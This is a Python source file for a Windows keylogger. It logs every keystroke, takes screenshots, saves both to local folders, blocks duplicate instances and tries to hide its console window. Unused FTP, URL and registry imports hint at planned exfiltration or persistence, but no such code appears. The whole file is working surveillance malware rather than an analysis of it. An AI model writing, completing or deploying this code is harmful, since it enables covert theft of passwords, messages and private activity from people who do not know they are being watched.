import os
import sys
import threading
import urllib,urllib3
import urllib.request
import win32console
import win32gui
import ftplib
from datetime import datetime
import time
import pyautogui
import logging
from pynput.keyboard import Key, Listener

#Disallowing Multiple Instance
import win32event, win32api, winerror
from winreg import *
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple Instance not Allowed")
    exit(0)

#Create Folders if they don't exist
if not os.path.exists('Images'):
    os.makedirs('Images')
if not os.path.exists('Logged'):
    os.makedirs('Logged')

logged_name = "Logged\\%s.txt" % (str(str( datetime.now().timestamp())[:str( datetime.now().timestamp()).index('.')]))

data=''
count=0

#Local Keylogger
def local(check):
    global data
    if(not check):
        if len(data)>100:
            myScreenshot = pyautogui.screenshot()
            now = datetime.now()
            images_name = "Images\\%s.png" % (str(str(now.timestamp())[:str(now.timestamp()).index('.')]))
            myScreenshot.save(images_name)
            fp=open(logged_name,"a")
            fp.write(data)
            fp.close()
            data=''
    if(check):
        myScreenshot = pyautogui.screenshot()
        now = datetime.now()
        images_name = "Images\\%s.png" % (str(str(now.timestamp())[:str(now.timestamp()).index('.')]))
        myScreenshot.save(images_name)
        fp=open(logged_name,"a")
        fp.write(data)
        fp.close()
        data=''
    return True

def on_press(key):
    global data
    if(str(key).lower()=="key.esc") :
        local(True)
        return False
    data = data + str(key)
    local(False)

with Listener(on_press=on_press) as listener:
    listener.join()

def main():
    #Hide Window
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

if __name__ == '__main__':
    main() 
 